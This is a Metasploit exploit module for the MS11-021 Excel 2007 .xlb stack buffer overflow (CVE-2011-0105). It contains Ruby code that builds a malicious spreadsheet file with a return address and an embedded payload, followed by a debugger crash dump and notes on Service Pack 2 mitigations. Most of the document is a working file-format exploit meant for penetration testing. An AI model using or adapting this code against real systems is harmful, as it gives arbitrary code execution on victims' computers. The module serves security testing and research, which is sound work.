##
# $Id: ms11_021_xlb_bof.rb 14169 2011-11-05 23:05:42Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info={})
		super(update_info(info,
			'Name'           => "MS11-021 Microsoft Office 2007 Excel .xlb Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in Excel of Microsoft Office 2007.
				By supplying a malformed .xlb file, an attacker can control the content (source)
				of a memcpy routine, and the number of bytes to copy, therefore causing a stack-
				based buffer overflow.  This results aribrary code execution under the context of
				user the user.
			},
			'License'        => MSF_LICENSE,
			'Version'        => "$Revision: 14169 $",
			'Author'         =>
				[
					'Aniway',       #Initial discovery (via ZDI)
					'abysssec',     #RCA, poc
					'sinn3r',       #Metasploit
					'juan vazquez'  #Metasploit
				],
			'References'     =>
				[
					['CVE', '2011-0105'],
					['MSB', 'MS11-021'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-121/'],
					['URL', 'http://www.abysssec.com/blog/2011/11/02/microsoft-excel-2007-sp2-buffer-overwrite-vulnerability-ba-exploit-ms11-021/']
				],
			'Payload'        =>
				{
					'StackAdjustment' => -3500,
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'          => "process",
					'DisablePayloadHandler' => 'true',
					'InitialAutoRunScript'  => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# JMP ESP in EXCEL (Office 2007)
					# Win XP SP3 (Vista and 7 will try to repair the file)
					['Microsoft Office Excel 2007 on Windows XP', {'Ret' => 0x3006A48D }],
				],
			'Privileged'     => false,
			'DisclosureDate' => "Aug 9 2011",
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [true, 'The filename', 'msf.xlb'])
				], self.class)
	end

	def exploit
		path = File.join(Msf::Config.install_root, 'data', 'exploits', 'CVE-2011-0105.xlb')
		f = File.open(path, 'rb')
		template = f.read
		f.close

		p = payload.encoded

		# Offset 1556
		record = ''
		record << "\xa7\x00"                        #record type
		record << "\x04\x00"                        #record length
		record << "\xb0\x0f\x0c\x00"                #data

		# Offset 1564
		continue_record = ''
		continue_record << "\x3c\x00"               #record type
		continue_record << [p.length+32].pack('v')  #length

		buf  = ''
		buf << template[0, 1556]
		buf << record
		buf << continue_record
		buf << rand_text_alpha(1)
		buf << [target.ret].pack('V*')
		buf << "\x00"*12
		buf << p
		buf << template[2336, template.length]

		file_create(buf)
	end
end

=begin
0:000> r
eax=41414141 ebx=00000000 ecx=00000006 edx=008c1504 esi=0000007f edi=00000005
eip=301a263d esp=00137ef8 ebp=00137f6c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
EXCEL!Ordinal40+0x1a263d:
301a263d 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
0:000> dc esp
00137ef8  00000000 00000000 41414141 41414141  ........AAAAAAAA
00137f08  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f18  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f28  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f38  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f48  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00137f58  41414141 41414141 41414141 00000000  AAAAAAAAAAAA....
00137f68  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA

On SP2, the stack overwrite begins way before the stack canary, which causes the exploit
to fail when the stack cookie gets checked, and then exits.  All loaded compnents are
protected by SafeSEH, as well.  See:
http://dev.metasploit.com/redmine/issues/5917

=end